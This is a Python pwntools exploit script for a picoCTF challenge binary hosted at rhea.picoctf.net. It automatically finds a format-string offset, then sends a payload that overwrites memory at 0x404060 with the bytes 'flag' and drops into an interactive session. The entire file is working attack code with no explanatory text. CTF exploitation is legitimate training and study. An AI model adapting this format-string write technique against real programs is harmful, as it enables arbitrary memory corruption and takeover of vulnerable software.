#!/usr/bin/env python3
from pwn import *
from struct import pack

context.binary = binary = ELF("./vuln")
# libc = ELF("./libc.so.6")

addr = 'rhea.picoctf.net'
port = '56938'

def conn():
    if args.LOCAL:
        r = process([binary.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote(addr, port)
    return r

def exec_func(payload):
    with process("./vuln") as p:
        p.sendline(payload)
        res = p.recvall()
        print(res)
        return res.strip()

def attack(r, **kwargs):
    fmtstr = FmtStr(exec_func)
    r.recvuntil("say?\n")
    payload = b"A"*fmtstr.padlen + fmtstr_payload(
            fmtstr.offset, {0x404060: 0x67616c66}
            )
    print("payload=", payload)
    r.sendline(payload)


def main():
    r = conn()
    attack(r)
    r.interactive()


if __name__ == "__main__":
    main()
